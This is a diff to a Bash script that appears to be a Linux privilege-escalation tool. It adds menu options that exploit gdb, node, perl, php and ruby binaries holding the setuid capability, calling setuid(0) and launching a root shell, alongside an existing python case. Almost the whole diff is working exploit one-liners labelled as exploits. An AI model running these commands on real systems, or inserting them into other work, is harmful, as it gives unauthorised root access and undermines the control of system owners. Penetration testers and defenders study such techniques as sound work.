@@ -171,9 +171,68 @@ while true; do
 
                 select choice in $ShellCap "Go Back"; do
                     case "$choice" in
+                        *gdb*)
+                                        
+                            echo "Trying with $choice"
+                            
+                            "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+                            
+                        *node*)
+                                        
+                            echo "Trying with $choice"
+                            
+                            "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+                            
+                        *perl*)
+                                        
+                            echo "Trying with $choice"
+                            
+                            "$choice" -e 'exec "/bin/bash"'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+                            
+                        *php*)
+                                        
+                            echo "Trying with $choice"
+                            
+                            "$choice" -r 'posix_setuid(0); system("/bin/bash -i");'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+                            
                         *python*)
-                        
-                        
+                                        
                             echo "Trying with $choice"
                             
                             "$choice" -c 'import os; os.setuid(0); os.system("bash")'
@@ -186,6 +245,23 @@ while true; do
                                 break 2
                             fi
                             ;;
+                            
+                        *ruby*)
+                                        
+                            echo "Trying with $choice"
+                            
+                            "$choice" -e 'Process::Sys.setuid(0); exec "/bin/bash"'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+
+    
                         "Go Back")
                             break 2
                             ;;
